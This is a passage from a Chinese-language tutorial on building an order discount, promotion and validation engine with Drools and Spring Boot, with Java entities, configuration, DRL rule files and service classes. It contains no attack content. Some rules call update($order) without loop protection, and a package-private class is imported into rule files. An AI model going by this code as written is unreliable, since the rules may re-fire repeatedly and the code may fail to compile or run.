        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7">2.2 项目结构</h4>
<pre><code class="hljs language-css" lang="css">drools-demo/
├── <span class="hljs-attribute">src</span>/
│   ├── <span class="hljs-selector-tag">main</span>/
│   │   ├── java/
│   │   │   └── com/example/drools/
│   │   │       ├── config/
│   │   │       │   └── DroolsConfig<span class="hljs-selector-class">.java</span>
│   │   │       ├── model/
│   │   │       │   ├── <span class="hljs-attribute">Order</span><span class="hljs-selector-class">.java</span>
│   │   │       │   ├── Customer<span class="hljs-selector-class">.java</span>
│   │   │       │   └── Product<span class="hljs-selector-class">.java</span>
│   │   │       ├── service/
│   │   │       │   └── RuleService<span class="hljs-selector-class">.java</span>
│   │   │       └── DroolsApplication<span class="hljs-selector-class">.java</span>
│   │   └── resources/
│   │       ├── rules/
│   │       │   ├── discount-rules<span class="hljs-selector-class">.drl</span>
│   │       │   ├── validation-rules<span class="hljs-selector-class">.drl</span>
│   │       │   └── promotion-rules<span class="hljs-selector-class">.drl</span>
│   │       ├── META-INF/
│   │       │   └── kmodule<span class="hljs-selector-class">.xml</span>
│   │       └── application<span class="hljs-selector-class">.yml</span>
│   └── test/
└── pom<span class="hljs-selector-class">.xml</span>
</code></pre>
<h3 data-id="heading-8">三、实体模型定义</h3>
<h4 data-id="heading-9">3.1 订单实体</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.model;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> Customer customer;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> BigDecimal totalAmount;
    <span class="hljs-keyword">private</span> <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discountAmount</span> <span class="hljs-operator">=</span> BigDecimal.ZERO;
    <span class="hljs-keyword">private</span> BigDecimal finalAmount;
    <span class="hljs-keyword">private</span> String status;
    <span class="hljs-keyword">private</span> LocalDateTime orderTime;
    <span class="hljs-keyword">private</span> String promotionCode;

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">calculateTotalAmount</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.totalAmount = items.stream()
                .map(OrderItem::getSubtotal)
                .reduce(BigDecimal.ZERO, BigDecimal::add);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">applyDiscount</span><span class="hljs-params">(BigDecimal discount)</span> {
        <span class="hljs-built_in">this</span>.discountAmount = <span class="hljs-built_in">this</span>.discountAmount.add(discount);
        <span class="hljs-built_in">this</span>.finalAmount = <span class="hljs-built_in">this</span>.totalAmount.subtract(<span class="hljs-built_in">this</span>.discountAmount);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getItemCount</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream()
                .mapToInt(OrderItem::getQuantity)
                .sum();
    }
}

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {
    <span class="hljs-keyword">private</span> Product product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> BigDecimal price;
    <span class="hljs-keyword">private</span> BigDecimal subtotal;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">calculateSubtotal</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.subtotal = <span class="hljs-built_in">this</span>.price.multiply(BigDecimal.valueOf(quantity));
    }
}
</code></pre>
<h4 data-id="heading-10">3.2 客户实体</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.model;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.time.LocalDate;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Customer</span> {
    <span class="hljs-keyword">private</span> Long customerId;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String level;  <span class="hljs-comment">// VIP, GOLD, SILVER, NORMAL</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> loyaltyPoints;
    <span class="hljs-keyword">private</span> LocalDate memberSince;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isNewCustomer;

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMemberYears</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> LocalDate.now().getYear() - memberSince.getYear();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isVip</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"VIP"</span>.equals(level);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isGold</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"GOLD"</span>.equals(level);
    }
}
</code></pre>
<h4 data-id="heading-11">3.3 产品实体</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.model;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.math.BigDecimal;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-keyword">private</span> Long productId;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String category;  <span class="hljs-comment">// ELECTRONICS, CLOTHING, FOOD, BOOKS</span>
    <span class="hljs-keyword">private</span> BigDecimal price;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> onSale;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> stockQuantity;

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInStock</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> stockQuantity &gt; <span class="hljs-number">0</span>;
    }
}
</code></pre>
<h3 data-id="heading-12">四、Drools配置</h3>
<h4 data-id="heading-13">4.1 KModule配置文件</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- src/main/resources/META-INF/kmodule.xml --&gt;</span>
<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">kmodule</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.drools.org/xsd/kmodule"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">kbase</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"rules"</span> <span class="hljs-attr">packages</span>=<span class="hljs-string">"rules"</span> <span class="hljs-attr">default</span>=<span class="hljs-string">"true"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ksession</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ksession-rules"</span> <span class="hljs-attr">default</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"stateful"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">kbase</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">kmodule</span>&gt;</span>
</code></pre>
<h4 data-id="heading-14">4.2 Spring Boot配置类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.config;

<span class="hljs-keyword">import</span> org.kie.api.KieServices;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieBuilder;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieFileSystem;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieModule;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.kie.internal.io.ResourceFactory;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.core.io.Resource;
<span class="hljs-keyword">import</span> org.springframework.core.io.support.PathMatchingResourcePatternResolver;
<span class="hljs-keyword">import</span> org.springframework.core.io.support.ResourcePatternResolver;

<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DroolsConfig</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">RULES_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">"rules/"</span>;

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KieContainer <span class="hljs-title function_">kieContainer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">KieServices</span> <span class="hljs-variable">kieServices</span> <span class="hljs-operator">=</span> KieServices.Factory.get();
        <span class="hljs-type">KieFileSystem</span> <span class="hljs-variable">kieFileSystem</span> <span class="hljs-operator">=</span> kieServices.newKieFileSystem();

        <span class="hljs-comment">// 加载所有规则文件</span>
        <span class="hljs-type">ResourcePatternResolver</span> <span class="hljs-variable">resourcePatternResolver</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathMatchingResourcePatternResolver</span>();
        Resource[] resources = resourcePatternResolver
                .getResources(<span class="hljs-string">"classpath*:"</span> + RULES_PATH + <span class="hljs-string">"**/*.drl"</span>);

        <span class="hljs-keyword">for</span> (Resource resource : resources) {
            kieFileSystem.write(ResourceFactory.newClassPathResource(
                    RULES_PATH + resource.getFilename(), <span class="hljs-string">"UTF-8"</span>));
        }

        <span class="hljs-type">KieBuilder</span> <span class="hljs-variable">kieBuilder</span> <span class="hljs-operator">=</span> kieServices.newKieBuilder(kieFileSystem);
        kieBuilder.buildAll();

        <span class="hljs-type">KieModule</span> <span class="hljs-variable">kieModule</span> <span class="hljs-operator">=</span> kieBuilder.getKieModule();
        <span class="hljs-keyword">return</span> kieServices.newKieContainer(kieModule.getReleaseId());
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KieSession <span class="hljs-title function_">kieSession</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">return</span> kieContainer().newKieSession();
    }
}
</code></pre>
<h3 data-id="heading-15">五、规则文件编写</h3>
<h4 data-id="heading-16">5.1 折扣规则</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// src/main/resources/rules/discount-rules.drl</span>
<span class="hljs-keyword">package</span> rules

<span class="hljs-keyword">import</span> com.example.drools.model.Order
<span class="hljs-keyword">import</span> com.example.drools.model.Customer
<span class="hljs-keyword">import</span> java.math.BigDecimal

<span class="hljs-comment">// 规则1: VIP客户享受15%折扣</span>
rule <span class="hljs-string">"VIP Customer Discount"</span>
    salience <span class="hljs-number">100</span>  <span class="hljs-comment">// 优先级</span>
    when
        $order: Order(customer.level == <span class="hljs-string">"VIP"</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.15"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用VIP折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则2: 金卡客户享受10%折扣</span>
rule <span class="hljs-string">"Gold Customer Discount"</span>
    salience <span class="hljs-number">90</span>
    when
        $order: Order(customer.level == <span class="hljs-string">"GOLD"</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.10"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用金卡折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则3: 订单金额超过1000元享受8%折扣</span>
rule <span class="hljs-string">"Large Order Discount"</span>
    salience <span class="hljs-number">80</span>
    when
        $order: Order(totalAmount &gt;= <span class="hljs-number">1000</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.08"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用大额订单折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则4: 新客户首单享受5%折扣</span>
rule <span class="hljs-string">"New Customer First Order Discount"</span>
    salience <span class="hljs-number">70</span>
    when
        $order: Order(customer.isNewCustomer == <span class="hljs-literal">true</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.05"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用新客户折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则5: 购买商品数量超过10件享受额外折扣</span>
rule <span class="hljs-string">"Bulk Purchase Discount"</span>
    salience <span class="hljs-number">60</span>
    when
        $order: Order(itemCount &gt; <span class="hljs-number">10</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"50"</span>);
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用批量购买折扣: "</span> + discount);
        update($order);
end
</code></pre>
<h4 data-id="heading-17">5.2 促销规则</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// src/main/resources/rules/promotion-rules.drl</span>
<span class="hljs-keyword">package</span> rules

<span class="hljs-keyword">import</span> com.example.drools.model.Order
<span class="hljs-keyword">import</span> com.example.drools.model.OrderItem
<span class="hljs-keyword">import</span> com.example.drools.model.Product
<span class="hljs-keyword">import</span> java.math.BigDecimal
<span class="hljs-keyword">import</span> java.time.LocalDateTime
<span class="hljs-keyword">import</span> java.time.LocalTime

<span class="hljs-comment">// 规则1: 电子产品类别促销 - 买2送1</span>
rule <span class="hljs-string">"Electronics Buy 2 Get 1 Free"</span>
    when
        $order: Order()
        $item: OrderItem(product.category == <span class="hljs-string">"ELECTRONICS"</span>, quantity &gt;= <span class="hljs-number">2</span>) from $order.items
    then
        <span class="hljs-type">int</span> <span class="hljs-variable">freeItems</span> <span class="hljs-operator">=</span> $item.getQuantity() / <span class="hljs-number">2</span>;
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $item.getPrice()
                .multiply(BigDecimal.valueOf(freeItems));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"电子产品买2送1，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则2: 促销码应用</span>
rule <span class="hljs-string">"Promotion Code - SAVE20"</span>
    when
        $order: Order(promotionCode == <span class="hljs-string">"SAVE20"</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.20"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用促销码SAVE20，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则3: 限时促销 - 每天10-12点额外9折</span>
rule <span class="hljs-string">"Time Limited Promotion"</span>
    when
        $order: Order()
        eval(LocalTime.now().isAfter(LocalTime.of(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>)) &amp;&amp;
             LocalTime.now().isBefore(LocalTime.of(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>)))
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.10"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用限时促销，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则4: 满减活动 - 满500减50</span>
rule <span class="hljs-string">"Full Reduction 500-50"</span>
    when
        $order: Order(totalAmount &gt;= <span class="hljs-number">500</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"50"</span>);
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"满500减50，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则5: 特定品类组合优惠</span>
rule <span class="hljs-string">"Category Combo Discount"</span>
    when
        $order: Order()
        exists(OrderItem(product.category == <span class="hljs-string">"ELECTRONICS"</span>) from $order.items)
        exists(OrderItem(product.category == <span class="hljs-string">"BOOKS"</span>) from $order.items)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"30"</span>);
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"电子产品+图书组合优惠: "</span> + discount);
        update($order);
end
</code></pre>
<h4 data-id="heading-18">5.3 验证规则</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// src/main/resources/rules/validation-rules.drl</span>
<span class="hljs-keyword">package</span> rules

<span class="hljs-keyword">import</span> com.example.drools.model.Order
<span class="hljs-keyword">import</span> com.example.drools.model.OrderItem
<span class="hljs-keyword">import</span> com.example.drools.model.Product

global java.util.List validationErrors

<span class="hljs-comment">// 规则1: 库存验证</span>
rule <span class="hljs-string">"Check Product Stock"</span>
    when
        $order: Order()
        $item: OrderItem(product.stockQuantity &lt; quantity) from $order.items
    then
        validationErrors.add(<span class="hljs-string">"产品 "</span> + $item.getProduct().getName() +
                           <span class="hljs-string">" 库存不足，库存: "</span> + $item.getProduct().getStockQuantity() +
                           <span class="hljs-string">"，需求: "</span> + $item.getQuantity());
        System.out.println(<span class="hljs-string">"库存验证失败: "</span> + $item.getProduct().getName());
end

<span class="hljs-comment">// 规则2: 订单金额验证</span>
rule <span class="hljs-string">"Minimum Order Amount"</span>
    when
        $order: Order(totalAmount &lt; <span class="hljs-number">10</span>)
    then
        validationErrors.add(<span class="hljs-string">"订单金额不能少于10元"</span>);
        System.out.println(<span class="hljs-string">"订单金额验证失败"</span>);
end

<span class="hljs-comment">// 规则3: 订单项数量验证</span>
rule <span class="hljs-string">"Maximum Item Quantity"</span>
    when
        $order: Order()
        $item: OrderItem(quantity &gt; <span class="hljs-number">100</span>) from $order.items
    then
        validationErrors.add(<span class="hljs-string">"单个商品购买数量不能超过100件"</span>);
        System.out.println(<span class="hljs-string">"商品数量验证失败"</span>);
end

<span class="hljs-comment">// 规则4: VIP客户特殊权限</span>
rule <span class="hljs-string">"VIP Special Product Access"</span>
    when
        $order: Order(customer.level != <span class="hljs-string">"VIP"</span>)
        $item: OrderItem(product.name matches <span class="hljs-string">".*VIP专享.*"</span>) from $order.items
    then
        validationErrors.add(<span class="hljs-string">"VIP专享商品仅限VIP客户购买"</span>);
        System.out.println(<span class="hljs-string">"VIP权限验证失败"</span>);
end
</code></pre>
<h3 data-id="heading-19">六、规则服务实现</h3>
<h4 data-id="heading-20">6.1 规则引擎服务</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> com.example.drools.model.Order;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuleService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KieContainer kieContainer;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RuleService</span><span class="hljs-params">(KieContainer kieContainer)</span> {
        <span class="hljs-built_in">this</span>.kieContainer = kieContainer;
    }

    <span class="hljs-comment">/**
     * 执行折扣规则
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">applyDiscountRules</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"开始执行折扣规则，订单ID: {}"</span>, order.getOrderId());

            <span class="hljs-comment">// 插入事实对象</span>
            kieSession.insert(order);

            <span class="hljs-comment">// 触发所有规则</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">firedRules</span> <span class="hljs-operator">=</span> kieSession.fireAllRules();

            log.info(<span class="hljs-string">"执行了 {} 条规则"</span>, firedRules);
            log.info(<span class="hljs-string">"原始金额: {}, 折扣金额: {}, 最终金额: {}"</span>,
                    order.getTotalAmount(),
                    order.getDiscountAmount(),
                    order.getFinalAmount());

            <span class="hljs-keyword">return</span> order;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }

    <span class="hljs-comment">/**
     * 验证订单
     */</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">validateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();
        List&lt;String&gt; validationErrors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"开始验证订单，订单ID: {}"</span>, order.getOrderId());

            <span class="hljs-comment">// 设置全局变量</span>
            kieSession.setGlobal(<span class="hljs-string">"validationErrors"</span>, validationErrors);

            <span class="hljs-comment">// 插入事实对象</span>
            kieSession.insert(order);
            order.getItems().forEach(kieSession::insert);

            <span class="hljs-comment">// 触发所有规则</span>
            kieSession.fireAllRules();

            <span class="hljs-keyword">if</span> (validationErrors.isEmpty()) {
                log.info(<span class="hljs-string">"订单验证通过"</span>);
            } <span class="hljs-keyword">else</span> {
                log.warn(<span class="hljs-string">"订单验证失败: {}"</span>, validationErrors);
            }

            <span class="hljs-keyword">return</span> validationErrors;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }

    <span class="hljs-comment">/**
     * 执行指定规则
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">applySpecificRule</span><span class="hljs-params">(Order order, String ruleName)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"执行指定规则: {}"</span>, ruleName);

            kieSession.insert(order);

            <span class="hljs-comment">// 执行指定的规则</span>
            kieSession.getAgenda().getAgendaGroup(ruleName).setFocus();
            kieSession.fireAllRules();

            <span class="hljs-keyword">return</span> order;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }

    <span class="hljs-comment">/**
     * 批量处理订单
     */</span>
    <span class="hljs-keyword">public</span> List&lt;Order&gt; <span class="hljs-title function_">batchProcessOrders</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"批量处理 {} 个订单"</span>, orders.size());

            <span class="hljs-comment">// 插入所有订单</span>
            orders.forEach(kieSession::insert);

            <span class="hljs-comment">// 触发所有规则</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">firedRules</span> <span class="hljs-operator">=</span> kieSession.fireAllRules();
            log.info(<span class="hljs-string">"总共执行了 {} 条规则"</span>, firedRules);

            <span class="hljs-keyword">return</span> orders;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }
}
</code></pre>
<h4 data-id="heading-21">6.2 订单处理服务</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> com.example.drools.model.*;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RuleService ruleService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(RuleService ruleService)</span> {
        <span class="hljs-built_in">this</span>.ruleService = ruleService;
    }

    <span class="hljs-comment">/**
     * 创建订单并应用规则
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Customer customer, List&lt;OrderItem&gt; items, String promotionCode)</span> {
        <span class="hljs-comment">// 创建订单</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setOrderId(System.currentTimeMillis());
        order.setCustomer(customer);
        order.setItems(items);
        order.setOrderTime(LocalDateTime.now());
        order.setPromotionCode(promotionCode);
        order.setStatus(<span class="hljs-string">"CREATED"</span>);

        <span class="hljs-comment">// 计算小计</span>
        items.forEach(OrderItem::calculateSubtotal);

        <span class="hljs-comment">// 计算总金额</span>
        order.calculateTotalAmount();
        order.setFinalAmount(order.getTotalAmount());

        log.info(<span class="hljs-string">"创建订单: {}, 客户: {}, 原始金额: {}"</span>,
                order.getOrderId(),
                customer.getName(),
                order.getTotalAmount());

        <span class="hljs-comment">// 验证订单</span>
        List&lt;String&gt; errors = ruleService.validateOrder(order);
        <span class="hljs-keyword">if</span> (!errors.isEmpty()) {
            order.setStatus(<span class="hljs-string">"VALIDATION_FAILED"</span>);
            log.error(<span class="hljs-string">"订单验证失败: {}"</span>, errors);
            <span class="hljs-keyword">return</span> order;
        }

        <span class="hljs-comment">// 应用折扣规则</span>
        order = ruleService.applyDiscountRules(order);
        order.setStatus(<span class="hljs-string">"CONFIRMED"</span>);

        log.info(<span class="hljs-string">"订单处理完成: {}, 最终金额: {}, 节省: {}"</span>,
                order.getOrderId(),
                order.getFinalAmount(),
                order.getDiscountAmount());

        <span class="hljs-keyword">return</span> order;
    }

    <span class="hljs-comment">/**
     * 计算订单优惠预览
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">previewDiscount</span><span class="hljs-params">(Order order)</span> {
